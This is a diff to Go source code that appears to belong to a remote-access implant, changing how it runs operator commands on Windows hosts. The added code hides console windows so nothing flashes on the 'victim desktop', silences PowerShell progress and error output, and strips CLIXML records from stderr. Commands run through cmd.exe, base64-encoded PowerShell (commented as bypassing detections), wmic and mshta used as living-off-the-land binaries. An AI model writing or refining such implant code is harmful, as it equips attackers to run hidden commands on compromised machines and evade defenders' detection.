@@ -11,9 +11,15 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"syscall"
 	"time"
 	"unicode/utf16"
 )
+
+// CREATE_NO_WINDOW prevents child processes from opening a console window.
+// Without this flag, spawning cmd.exe/powershell.exe on a windowsgui agent
+// causes a brief visible flash on the victim desktop.
+const createNoWindow = 0x08000000
 
 // runCommand dispatches to the configured execution method (baked in at build time).
 // method: direct | cmd | powershell | wmi | mshta
@@ -37,9 +43,10 @@ func runCommand(method, command string, timeout int) (stdout, stderr string, exi
 	}
 }
 
-// execCMD runs a command via cmd.exe /C
+// execCMD runs a command via cmd.exe /C with no visible window.
 func execCMD(ctx context.Context, command string) (string, string, int) {
 	cmd := exec.CommandContext(ctx, "cmd.exe", "/C", command)
+	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
 	var out, errBuf bytes.Buffer
 	cmd.Stdout = &out
 	cmd.Stderr = &errBuf
@@ -49,18 +56,43 @@ func execCMD(ctx context.Context, command string) (string, string, int) {
 
 // execPowerShell runs a command via powershell.exe -EncodedCommand (UTF-16LE base64).
 // Bypasses many string-match detections on "powershell -c".
+// The command is prefixed to silence progress bars and CLIXML noise that would
+// otherwise appear in stderr and cause the server to mark results as "failed".
 func execPowerShell(ctx context.Context, command string) (string, string, int) {
-	encoded := psEncode(command)
+	// Suppress ProgressPreference to prevent CLIXML progress records on stderr.
+	// Suppress ErrorActionPreference so non-terminating errors don't pollute stderr.
+	wrapped := `$ProgressPreference='SilentlyContinue';$ErrorActionPreference='SilentlyContinue';` + command
+	encoded := psEncode(wrapped)
 	cmd := exec.CommandContext(ctx,
 		"powershell.exe",
 		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
 		"-EncodedCommand", encoded,
 	)
+	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
 	var out, errBuf bytes.Buffer
 	cmd.Stdout = &out
 	cmd.Stderr = &errBuf
 	err := cmd.Run()
-	return strings.TrimSpace(out.String()), strings.TrimSpace(errBuf.String()), exitCodeFrom(err)
+	stderrStr := filterCLIXML(strings.TrimSpace(errBuf.String()))
+	return strings.TrimSpace(out.String()), stderrStr, exitCodeFrom(err)
+}
+
+// filterCLIXML strips PowerShell CLIXML progress/error records from stderr.
+// These are harmless metadata lines that would otherwise cause the server to
+// mark a successful command as "failed".
+func filterCLIXML(s string) string {
+	if !strings.Contains(s, "CLIXML") && !strings.Contains(s, "<Objs") {
+		return s
+	}
+	var keep []string
+	for _, line := range strings.Split(s, "\n") {
+		t := strings.TrimSpace(line)
+		if t == "#< CLIXML" || strings.HasPrefix(t, "<Objs") || strings.HasPrefix(t, "<Obj") {
+			continue
+		}
+		keep = append(keep, line)
+	}
+	return strings.TrimSpace(strings.Join(keep, "\n"))
 }
 
 // execWMIC uses wmic.exe (LOLBin) to create a process via the WMI subsystem.
@@ -72,6 +104,7 @@ func execWMIC(ctx context.Context, command string) (string, string, int) {
 	wrapped := fmt.Sprintf(`cmd.exe /C %s > "%s" 2>&1`, command, tmp)
 
 	cmd := exec.CommandContext(ctx, "wmic.exe", "process", "call", "create", wrapped)
+	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
 	err := cmd.Run()
 
 	// Poll for output — WMI creates the child process asynchronously
@@ -103,6 +136,7 @@ func execMSHTA(ctx context.Context, command string) (string, string, int) {
 		escapedCmd, escapedTmp,
 	)
 	cmd := exec.CommandContext(ctx, "mshta.exe", script)
+	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
 	err := cmd.Run()
 
 	data, _ := os.ReadFile(tmp)
